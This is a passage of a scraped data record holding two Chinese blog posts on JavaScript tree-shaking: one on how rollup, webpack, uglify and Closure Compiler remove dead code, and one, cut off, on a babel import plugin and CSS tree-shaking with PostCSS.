src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6b8cae9900?w=720\u0026amp;h=405\u0026amp;f=jpeg\u0026amp;s=6384\"\u003e\u003c/div\u003e\u003cp\u003eTree-shaking的本质是消除无用的js代码。无用代码消除在广泛存在于传统的编程语言编译器中，编译器可以判断出某些代码根本不影响输出，然后消除这些代码，这个称之为DCE（dead code elimination）。\u003c/p\u003e\u003cp\u003eTree-shaking 是 DCE 的一种新的实现，Javascript同传统的编程语言不同的是，javascript绝大多数情况需要通过网络进行加载，然后执行，加载的文件大小越小，整体执行时间更短，所以去除无用代码以减少文件体积，对javascript来说更有意义。\u003c/p\u003e\u003cp\u003eTree-shaking 和传统的 DCE的方法又不太一样，传统的DCE 消灭不可能执行的代码，而Tree-shaking 更关注宇消除没有用到的代码。下面详细介绍一下DCE和Tree-shaking。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003e（1）先来看一下DCE消除大法\u003c/b\u003e\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6b8b4818fd?w=720\u0026amp;h=405\u0026amp;f=jpeg\u0026amp;s=13053\"\u003e\u003cdiv\u003e\u003cbr\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003eDead Code 一般具有以下几个特征\u003c/p\u003e\u003cp\u003e•代码不会被执行，不可到达\u003c/p\u003e\u003cp\u003e•代码执行的结果不会被用到\u003c/p\u003e\u003cp\u003e•代码只会影响死变量（只写不读）\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e下面红框标示的代码就属于死码，满足以上特征\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6baf4b104b?w=720\u0026amp;h=405\u0026amp;f=jpeg\u0026amp;s=16079\"\u003e\u003cdiv\u003e图4\u003c/div\u003e\u003c/div\u003e\u003cp\u003e传统编译型的语言中，都是由编译器将Dead Code从AST（抽象语法树）中删除，那javascript中是由谁做DCE呢？\u003c/p\u003e\u003cp\u003e首先肯定不是浏览器做DCE，因为当我们的代码送到浏览器，那还谈什么消除无法执行的代码来优化呢，所以肯定是送到浏览器之前的步骤进行优化。\u003c/p\u003e\u003cp\u003e其实也不是上面提到的三个工具，rollup，webpack，cc做的，而是著名的代码压缩优化工具uglify，uglify完成了javascript的DCE，下面通过一个实验来验证一下。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cblockquote\u003e以下所有的示例代码都能在我们的github中找到，欢迎戳❤\u003c/blockquote\u003e\u003cp\u003e\u003ca href=\"https://github.com/lin-xi/treeshaking/tree/master/rollup-webpack\"\u003ehttps://github.com/lin-xi/treeshaking/tree/master/rollup-webpack\u003c/a\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003e分别用rollup和webpack将图4中的代码进行打包\u003c/b\u003e\u003cbr\u003e\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6baf24ec38?w=720\u0026amp;h=438\u0026amp;f=jpeg\u0026amp;s=23130\"\u003e\u003cdiv\u003e图5\u003c/div\u003e\u003c/div\u003e\u003cp\u003e中间是rollup打包的结果，右边是webpack打包的结果\u003c/p\u003e\u003cp\u003e可以发现，rollup将无用的代码foo函数和unused函数消除了，但是仍然保留了不会执行到的代码，而webpack完整的保留了所有的无用代码和不会执行到的代码。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003e分别用rollup + uglify和 webpack + uglify 将图4中的代码进行打包\u003c/b\u003e\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bb11fd152?w=720\u0026amp;h=463\u0026amp;f=jpeg\u0026amp;s=40456\"\u003e\u003cdiv\u003e图6\u003c/div\u003e\u003c/div\u003e\u003cp\u003e中间是配置文件，右侧是结果\u003c/p\u003e\u003cp\u003e可以看到右侧最终打包结果中都去除了无法执行到的代码，结果符合我们的预期。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003e(2) 再来看一下Tree-shaking消除大法\u003c/b\u003e\u003c/p\u003e\u003cp\u003e前面提到了tree-shaking更关注于无用模块的消除，消除那些引用了但并没有被使用的模块。\u003c/p\u003e\u003cp\u003e先思考一个问题，为什么tree-shaking是最近几年流行起来了？而前端模块化概念已经有很多年历史了，其实tree-shaking的消除原理是依赖于ES6的模块特性。\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bb8832182?w=720\u0026amp;h=405\u0026amp;f=jpeg\u0026amp;s=19655\"\u003e\u003c/div\u003e\u003cp\u003eES6 module 特点：\u003c/p\u003e\u003cul\u003e\u003cli\u003e只能作为模块顶层的语句出现\u003c/li\u003e\u003cli\u003eimport 的模块名只能是字符串常量\u003c/li\u003e\u003cli\u003eimport binding 是 immutable的\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eES6模块依赖关系是确定的，和运行时的状态无关，可以进行可靠的静态分析，这就是tree-shaking的基础。\u003c/p\u003e\u003cp\u003e所谓静态分析就是不执行代码，从字面量上对代码进行分析，ES6之前的模块化，比如我们可以动态require一个模块，只有执行后才知道引用的什么模块，这个就不能通过静态分析去做优化。\u003c/p\u003e\u003cp\u003e这是 ES6 modules 在设计时的一个重要考量，也是为什么没有直接采用 CommonJS，正是基于这个基础上，才使得 tree-shaking 成为可能，这也是为什么 rollup 和 webpack 2 都要用 ES6 module syntax 才能 tree-shaking。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e我们还是通过例子来详细了解一下\u003c/p\u003e\u003cp\u003e面向过程编程函数和面向对象编程是javascript最常用的编程模式和代码组织方式，从这两个方面来实验：\u003c/p\u003e\u003cul\u003e\u003cli\u003e函数消除实验\u003c/li\u003e\u003cli\u003e类消除实验\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e\u003cb\u003e先看下函数消除实验\u003c/b\u003e\u003c/p\u003e\u003cp\u003eutils中get方法没有被使用到，我们期望的是get方法最终被消除。\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bc4a537f6?w=720\u0026amp;h=646\u0026amp;f=jpeg\u0026amp;s=16134\"\u003e\u003c/div\u003e\u003cp\u003e注意，uglify目前不会跨文件去做DCE，所以上面这种情况，uglify是不能优化的。\u003c/p\u003e\u003cp\u003e\u003cb\u003e先看看rollup的打包结果\u003c/b\u003e\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bd406dd90?w=720\u0026amp;h=343\u0026amp;f=jpeg\u0026amp;s=18232\"\u003e\u003c/div\u003e\u003cp\u003e完全符合预期，最终结果中没有get方法\u003c/p\u003e\u003cp\u003e\u003cb\u003e再看看webpack的结果\u003c/b\u003e\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bcd7d371a?w=720\u0026amp;h=962\u0026amp;f=jpeg\u0026amp;s=67249\"\u003e\u003c/div\u003e\u003cp\u003e也符合预期，最终结果中没有get方法\u003c/p\u003e\u003cp\u003e可以看到rollup打包的结果比webpack更优化\u003c/p\u003e\u003cblockquote\u003e函数消除实验中，rollup和webpack都通过，符合预期\u003c/blockquote\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003e再来看下类消除实验\u003c/b\u003e\u003c/p\u003e\u003cp\u003e增加了对menu.js的引用，但其实代码中并没有用到menu的任何方法和变量，所以我们的期望是，最终代码中menu.js里的内容被消除\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bcd97b34f?w=720\u0026amp;h=446\u0026amp;f=jpeg\u0026amp;s=14514\"\u003e\u003cdiv\u003emain.js\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bd77e84e0?w=720\u0026amp;h=507\u0026amp;f=jpeg\u0026amp;s=17925\"\u003e\u003cdiv\u003emenu.js\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003cb\u003erollup打包结果\u003c/b\u003e\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bd7406d51?w=720\u0026amp;h=499\u0026amp;f=jpeg\u0026amp;s=48979\"\u003e\u003c/div\u003e\u003cp\u003e包中竟然包含了menu.js的全部代码\u003c/p\u003e\u003cp\u003e\u003cb\u003ewebpack打包结果\u003c/b\u003e\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bdec358f0?w=720\u0026amp;h=831\u0026amp;f=jpeg\u0026amp;s=84376\"\u003e\u003c/div\u003e\u003cp\u003e包中竟然也包含了menu.js的全部代码\u003c/p\u003e\u003cblockquote\u003e类消除实验中，rollup，webpack 全军覆没，都没有达到预期\u003c/blockquote\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bef14e6fd?w=521\u0026amp;h=534\u0026amp;f=jpeg\u0026amp;s=18147\"\u003e\u003cdiv\u003ewhat happend？\u003c/div\u003e\u003c/div\u003e\u003cp\u003e这跟我们想象的完全不一样啊？为什么呢？无用的类不能消除，这还能叫做tree-shaking吗？我当时一度怀疑自己的demo有问题，后来各种网上搜索，才明白demo没有错。\u003c/p\u003e\u003cp\u003e下面摘取了rollup核心贡献者的的一些回答：\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bef36c293?w=720\u0026amp;h=482\u0026amp;f=jpeg\u0026amp;s=30357\"\u003e\u003cdiv\u003e图7\u003c/div\u003e\u003c/div\u003e\u003cul\u003e\u003cli\u003erollup只处理函数和顶层的import/export变量，不能把没用到的类的方法消除掉\u003c/li\u003e\u003cli\u003ejavascript动态语言的特性使得静态分析比较困难\u003c/li\u003e\u003cli\u003e图7下部分的代码就是副作用的一个例子，如果静态分析的时候删除里run或者jump，程序运行时就可能报错，那就本末倒置了，我们的目的是优化，肯定不能影响执行\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e再举个例子说明下为什么不能消除menu.js，比如下面这个场景\u003c/p\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eMenu\u003c/span\u003e\u003c/span\u003e() {\n}\n\nMenu.prototype.show = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e() {\n}\n\nArray.prototype.unique = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e() {\n    // 将 array 中的重复元素去除\n}\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default Menu;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e如果删除里menu.js，那对Array的扩展也会被删除，就会影响功能。那也许你会问，难道rollup，webpack不能区分是定义Menu的proptotype 还是定义Array的proptotype吗？当然如果代码写成上面这种形式是可以区分的，如果我写成这样呢？\u003c/p\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eMenu\u003c/span\u003e\u003c/span\u003e() {\n}\n\nMenu.prototype.show = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e() {\n}\n\nvar a = \u003cspan class=\"hljs-string\"\u003e'Arr'\u003c/span\u003e + \u003cspan class=\"hljs-string\"\u003e'ay'\u003c/span\u003e\nvar b\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(a == \u003cspan class=\"hljs-string\"\u003e'Array'\u003c/span\u003e) {\n    b = Array\n} \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n    b = Menu\n}\n\nb.prototype.unique = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e() {\n    // 将 array 中的重复元素去除\n}\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default Menu;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这种代码，静态分析是分析不了的，就算能静态分析代码，想要正确完全的分析也比较困难。\u003c/p\u003e\u003cp\u003e更多关于副作用的讨论，可以看这个\u003c/p\u003e\u003cp\u003e\u003ca href=\"http://link.zhihu.com/?target=https%3A//github.com/rollup/rollup/issues/349\"\u003e\u003cimg alt=\"图标\" src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bef801e7f?w=120\u0026amp;h=120\u0026amp;f=jpeg\u0026amp;s=6543\"\u003e\u003c/a\u003e\u003cbr\u003e\u003c/p\u003e\u003ca href=\"http://link.zhihu.com/?target=https%3A//github.com/rollup/rollup/issues/349\"\u003eTree shaking class methods · Issue #349 · rollup/rollupgithub.com\u003c/a\u003e\u003c/div\u003e\u003cdiv\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bf23f1d6d?w=720\u0026amp;h=405\u0026amp;f=jpeg\u0026amp;s=15712\"\u003e\u003c/div\u003e\u003cblockquote\u003etree-shaking对函数效果较好\u003c/blockquote\u003e\u003cp\u003e函数的副作用相对较少，顶层函数相对来说更容易分析，加上babel默认都是\"use strict\"严格模式，减少顶层函数的动态访问的方式，也更容易分析\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e我们开始说的三个工具，rollup和webpack表现不理想，那closure compiler又如何呢？\u003c/p\u003e\u003cp\u003e将示例中的代码用cc打包后得到的结果如下：\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6c102e5ed1?w=720\u0026amp;h=405\u0026amp;f=jpeg\u0026amp;s=17714\"\u003e\u003c/div\u003e\u003cp\u003e天啊，这不就是我们要的结果吗？完美消除所有无用代码的结果，输出的结果非常性感\u003c/p\u003e\u003cblockquote\u003eclosure compiler， tree-shaking的结果完美！\u003c/blockquote\u003e\u003cp\u003e可是不能高兴得太早，能得到这么完美结果是需要条件的，那就是cc的侵入式约束规范。必须在代码里添加这样的代码，看红线框标示的\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bf5516b9d?w=720\u0026amp;h=261\u0026amp;f=jpeg\u0026amp;s=19369\"\u003e\u003c/div\u003e\u003cp\u003egoogle定义一整套注解规范Annotating JavaScript for the Closure Compiler，想更多了解的，可以去看下官网。\u003c/p\u003e\u003cp\u003e侵入式这个就让人很不爽，google Closure Compiler是java写的，和我们基于node的各种构建库不可能兼容（不过目前好像已经有nodejs版 Closure Compiler），Closure Compiler使用起来也比较麻烦，所以虽然效果很赞，但比较难以应用到项目中，迁移成本较大。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003e说了这么多，总结一下：\u003c/b\u003e\u003c/p\u003e\u003cp\u003e三大工具的tree-shaking对于无用代码，无用模块的消除，都是有限的，有条件的。closure compiler是最好的，但与我们日常的基于node的开发流很难兼容。\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6c064d09f0?w=720\u0026amp;h=405\u0026amp;f=jpeg\u0026amp;s=6175\"\u003e\u003c/div\u003e\u003cp\u003etree-shaking对web意义重大，是一个极致优化的理想世界，是前端进化的又一个终极理想。\u003c/p\u003e\u003cp\u003e理想是美好的，但目前还处在发展阶段，还比较困难，有各个方面的，甚至有目前看来无法解\u003c/p\u003e\u003cp\u003e决的问题，但还是应该相信新技术能带来更好的前端世界。\u003c/p\u003e\u003cp\u003e优化是一种态度，不因小而不为，不因艰而不攻。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cblockquote\u003e知识有限，如果错误，请不惜指正，谢谢\u003c/blockquote\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e下一篇将继续介绍 \u003ca href=\"https://juejin.im/post/5a4dca1d518825128654fa78\"\u003eTree-Shaking性能优化实践 - 实践篇\u003c/a\u003e\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://juejin.im/post/5a4dca1d518825128654fa78\"\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6c0dc2ba58?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" alt=\"图标\"\u003e\u003c/a\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cblockquote\u003e\u003cbr\u003e本文中示例代码都能在我们的github中找到，欢迎戳❤\u003c/blockquote\u003e\u003cp\u003e\u003ca href=\"http://link.zhihu.com/?target=https%3A//github.com/lin-xi/treeshaking/tree/master/rollup-webpack\"\u003e\u003cimg alt=\"图标\" src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bb878d28e?w=120\u0026amp;h=120\u0026amp;f=jpeg\u0026amp;s=4686\"\u003e\u003c/a\u003e\u003c/p\u003e\u003cp\u003e\u003ca href=\"http://link.zhihu.com/?target=https%3A//github.com/lin-xi/treeshaking/tree/master/rollup-webpack\"\u003elin-xi/treeshakinggithub.com\u003c/a\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003c/div\u003e\u003cdiv\u003e\u003cbr\u003e\u003c/div\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e","buildTime":"1515066726.8632","__v":0}
{"_id":{"$oid":"5a4e17dee8405d2778beac8b"},"id":"5a4dca1d518825128654fa78","author":{"$oid":"5a4b76a1b11e1a170cb138d5"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/4/160bfd6c0dc2ba58?w=180\u0026h=120\u0026f=jpeg\u0026s=6581","https://user-gold-cdn.xitu.io/2018/1/4/160bfde2698a828b?w=720\u0026h=405\u0026f=jpeg\u0026s=6650","https://user-gold-cdn.xitu.io/2018/1/4/160bfde269ee60b1?w=720\u0026h=405\u0026f=jpeg\u0026s=11332","https://user-gold-cdn.xitu.io/2018/1/4/160bfde26a0b236a?w=720\u0026h=376\u0026f=jpeg\u0026s=21516","https://user-gold-cdn.xitu.io/2018/1/4/160bfde26a2f7bcd?w=720\u0026h=198\u0026f=jpeg\u0026s=10817","https://user-gold-cdn.xitu.io/2018/1/4/160bfde277e8ea5a?w=720\u0026h=405\u0026f=jpeg\u0026s=12869","https://user-gold-cdn.xitu.io/2018/1/4/160bfde276aaf2ac?w=720\u0026h=405\u0026f=jpeg\u0026s=9224","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bb878d28e?w=120\u0026h=120\u0026f=jpeg\u0026s=4686","https://user-gold-cdn.xitu.io/2018/1/4/160bfde28789c23f?w=720\u0026h=394\u0026f=jpeg\u0026s=16294","https://user-gold-cdn.xitu.io/2018/1/4/160bfde288369a85?w=720\u0026h=405\u0026f=jpeg\u0026s=17641","https://user-gold-cdn.xitu.io/2018/1/4/160bfde28dd70e3b?w=720\u0026h=219\u0026f=jpeg\u0026s=11908","https://user-gold-cdn.xitu.io/2018/1/4/160bfde29710f82d?w=720\u0026h=405\u0026f=jpeg\u0026s=18473","https://user-gold-cdn.xitu.io/2018/1/4/160bfde2a12a6464?w=720\u0026h=192\u0026f=jpeg\u0026s=9906","https://user-gold-cdn.xitu.io/2018/1/4/160bfde2a3cd1f44?w=720\u0026h=331\u0026f=jpeg\u0026s=21512","https://user-gold-cdn.xitu.io/2018/1/4/160bfde2aa751805?w=720\u0026h=405\u0026f=jpeg\u0026s=27747","https://user-gold-cdn.xitu.io/2018/1/4/160bfde2aa34e682?w=720\u0026h=405\u0026f=jpeg\u0026s=25678","https://user-gold-cdn.xitu.io/2018/1/4/160bfde2ae93d057?w=720\u0026h=405\u0026f=jpeg\u0026s=24291"],"screenShot":null}],"title":"Tree-Shaking性能优化实践 - 实践篇","meta":{"likeCount":0},"tag":["CSS","PostCSS","Webpack","Babel"],"comment":[],"shortContent":"三. tree-shaking实践 webpack2 发布，宣布支持tree-shaking，webpack 3发布，支持作用域提升，生成的bundle文件更小。 再没有升级webpack之前，增幻想我们的性能又要大幅提升了，对升级充满了期待。实际上事实是这样的 升级完之后，b…","content":"\u003cdiv\u003e\u003cp\u003e上一篇文章\u003ca href=\"https://juejin.im/post/5a4dc842518825698e7279a9\"\u003e Tree-Shaking性能优化实践 - 原理篇 \u003c/a\u003e介绍了 tree-shaking 的原理，本文主要介绍 tree-shaking 的实践\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://juejin.im/post/5a4dc842518825698e7279a9\"\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6c0dc2ba58?w=180\u0026amp;h=120\u0026amp;f=jpeg\u0026amp;s=6581\" alt=\"图标\"\u003e\u003c/a\u003e\u003cbr\u003e\u003cbr\u003e\u003c/p\u003e\u003c/div\u003e\u003cdiv\u003e\u003ch2\u003e三. tree-shaking实践\u003c/h2\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfde2698a828b?w=720\u0026amp;h=405\u0026amp;f=jpeg\u0026amp;s=6650\"\u003e\u003c/div\u003e\u003cp\u003ewebpack2 发布，宣布支持tree-shaking，webpack 3发布，支持作用域提升，生成的bundle文件更小。 再没有升级webpack之前，增幻想我们的性能又要大幅提升了，对升级充满了期待。实际上事实是这样的\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfde269ee60b1?w=720\u0026amp;h=405\u0026amp;f=jpeg\u0026amp;s=11332\"\u003e\u003c/div\u003e\u003cp\u003e升级完之后，bundle文件大小并没有大幅减少，当时有较大的心理落差，然后去研究了为什么效果不理想，原因见 \u003ca href=\"https://juejin.im/post/5a4dc842518825698e7279a9\"\u003eTree-Shaking性能优化实践 - 原理篇\u003c/a\u003e 。\u003c/p\u003e\u003cp\u003e优化还是要继续的，虽然工具自带的tree-shaking不能去除太多无用代码，在去除无用代码这一方面也还是有可以做的事情。我们从三个方面做里一些优化。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003ch2\u003e（1）对组件库引用的优化\u003c/h2\u003e\u003cp\u003e先来看一个问题\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfde26a0b236a?w=720\u0026amp;h=376\u0026amp;f=jpeg\u0026amp;s=21516\"\u003e\u003c/div\u003e\u003cp\u003e当我们使用组件库的时候，import {Button} from 'element-ui'，相对于Vue.use(elementUI)，已经是具有性能意识，是比较推荐的做法，但如果我们写成右边的形式，具体到文件的引用，打包之后的区别是非常大的，以antd为例，右边形式bundle体积减少约80%。\u003c/p\u003e\u003cp\u003e这个引用也属于有副作用，webpack不能把其他组件进行tree-shaking。既然工具本身是做不了，那我们可以做工具把左边代码自动改成右边代码这种形式。这个工具antd库本身也是提供的。我在antd的工具基础上做了少量的修改，不用任何配置，原生支持我们自己的组件库， \u003ca href=\"http://link.zhihu.com/?target=https%3A//w-ui.github.io/%23/doc\"\u003ewui\u003c/a\u003e 和 \u003ca href=\"http://link.zhihu.com/?target=https%3A//wmfe.github.io/xcui/%23/home\"\u003excui\u003c/a\u003e 以及一些其他常用的库\u003c/p\u003e\u003cp\u003e\u003cb\u003ebabel-plugin-import-fix ，缩小引用范围\u003c/b\u003e\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfde26a2f7bcd?w=720\u0026amp;h=198\u0026amp;f=jpeg\u0026amp;s=10817\"\u003e\u003c/div\u003e\u003ca href=\"http://link.zhihu.com/?target=https%3A//github.com/lin-xi/babel-plugin-import-fix\"\u003e\u003cimg alt=\"图标\" src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bb878d28e?w=120\u0026amp;h=120\u0026amp;f=jpeg\u0026amp;s=4686\"\u003e\u003c/a\u003e\u003c/div\u003e\u003cdiv\u003e\u003ca href=\"http://link.zhihu.com/?target=https%3A//github.com/lin-xi/babel-plugin-import-fix\"\u003elin-xi/babel-plugin-import-fix\u003c/a\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e下面介绍一下原理\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfde277e8ea5a?w=720\u0026amp;h=405\u0026amp;f=jpeg\u0026amp;s=12869\"\u003e\u003c/div\u003e\u003cp\u003e这是一个babel的插件，babel通过核心babylon将ES6代码转换成AST抽象语法树，然后插件遍历语法树找出类似import {Button} from 'element-ui'这样的语句，进行转换，最后重新生成代码。\u003c/p\u003e\u003cp\u003ebabel-plugin-import-fix默认支持antd，element，meterial-UI，wui，xcui和d3，只需要再.babelrc中配置插件本身就可以。\u003c/p\u003e\u003cp\u003e.babelrc\u003c/p\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e{\n  \u003cspan class=\"hljs-string\"\u003e\"presets\"\u003c/span\u003e: [\n    [\u003cspan class=\"hljs-string\"\u003e\"es2015\"\u003c/span\u003e, { \u003cspan class=\"hljs-string\"\u003e\"modules\"\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e }], \u003cspan class=\"hljs-string\"\u003e\"react\"\u003c/span\u003e\n  ],\n  \u003cspan class=\"hljs-string\"\u003e\"plugins\"\u003c/span\u003e: [\u003cspan class=\"hljs-string\"\u003e\"import-fix\"\u003c/span\u003e]\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfde276aaf2ac?w=720\u0026amp;h=405\u0026amp;f=jpeg\u0026amp;s=9224\"\u003e\u003c/div\u003e\u003cp\u003e其实是想把所有常用的库都默认支持，但很多常用的库却不支持缩小引用范围。因为没有独立输出各个子模块，不能把引用修改为对单个子模块的引用。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003ch2\u003e（2）CSS Tree-shaking\u003c/h2\u003e\u003cp\u003e我们前面所说的tree-shaking都是针对js文件，通过静态分析，尽可能消除无用的代码，那对于css我们能做tree-shaking吗？\u003c/p\u003e\u003cp\u003e随着CSS3，LESS，SASS等各种css预处理语言的普及，css文件在整个工程中占比是不可忽视的。随着大项目功能的不停迭代，导致css中可能就存在着无用的代码。我实现了一个webpack插件来解决这个问题，找出css代码无用的代码。\u003c/p\u003e\u003cp\u003e\u003cb\u003e\u003ca href=\"http://link.zhihu.com/?target=https%3A//github.com/lin-xi/webpack-css-treeshaking-plugin\"\u003ewebpack-css-treeshaking-plugin\u003c/a\u003e，对css进行tree-shaking\u003c/b\u003e\u003c/p\u003e\u003ca href=\"http://link.zhihu.com/?target=https%3A//github.com/lin-xi/babel-plugin-import-fix\"\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bb878d28e?w=120\u0026amp;h=120\u0026amp;f=jpeg\u0026amp;s=4686\" alt=\"图标\"\u003e\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://link.zhihu.com/?target=https%3A//github.com/lin-xi/webpack-css-treeshaking-plugin\"\u003ewebpack-css-treeshaking-plugin\u003cdiv\u003e\u003cdiv\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003c/a\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e下面介绍一下原理\u003c/p\u003e\u003cp\u003e整体思路是这样的，遍历所有的css文件中的selector选择器，然后去所有js代码中匹配，如果选择器没有在代码出现过，则认为该选择器是无用代码。\u003c/p\u003e\u003cp\u003e\u003cb\u003e首先面临的问题是，如何优雅的遍历所有的选择器呢？难道要用正则表达式很苦逼的去匹配分割吗？\u003c/b\u003e\u003c/p\u003e\u003cp\u003ebabel是js世界的福星，其实css世界也有利器，那就是postCss。\u003c/p\u003e\u003cp\u003ePostCSS 提供了一个解析器，它能够将 CSS 解析成AST抽象语法树。然后我们能写各种插件，对抽象语法树做处理，最终生成新的css文件，以达到对css进行精确修改的目的。\u003c/p\u003e\u003cdiv\u003e\u003cimg 